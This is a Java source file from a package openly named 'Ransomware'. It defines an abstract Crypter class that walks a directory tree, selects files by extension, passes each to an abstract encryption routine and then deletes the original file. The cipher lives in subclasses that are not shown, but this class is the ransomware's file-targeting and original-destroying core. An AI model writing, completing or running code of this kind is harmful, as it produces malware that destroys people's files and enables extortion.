package Ransomware;

import java.io.File;

public abstract class Crypter {
    protected FileFilter fileFilter;
    private String key;
    protected GeneratorFilePath generatorFilePath;


    public Crypter(String ext){
        this.fileFilter = new FileFilter(ext);
        this.generatorFilePath = new GeneratorFilePath(ext);
    }
    public Crypter(String ext,String key){
        this.fileFilter = new FileFilter(ext);
        this.key = key;
        this.generatorFilePath = new GeneratorFilePath(ext);
    }
    public void setKey(String key){ this.key = key; }
    public String getKey(){return key;}
    public abstract File getOutFile(File in);
    public abstract void doJob(File in, File out, String key);
    public void processFile(File in){
        if(!in.isDirectory()){
            doJob(in,getOutFile(in),getKey());
            in.delete();
        }
    }
    public void processFiles(File folder){
        for(File file : folder.listFiles()){
            if(!file.isDirectory()){
                if(isCryptableFile(file))
                    processFile(file);
            }else
                processFiles(file);
        }

    }


    public abstract boolean isCryptableFile(File file);

}
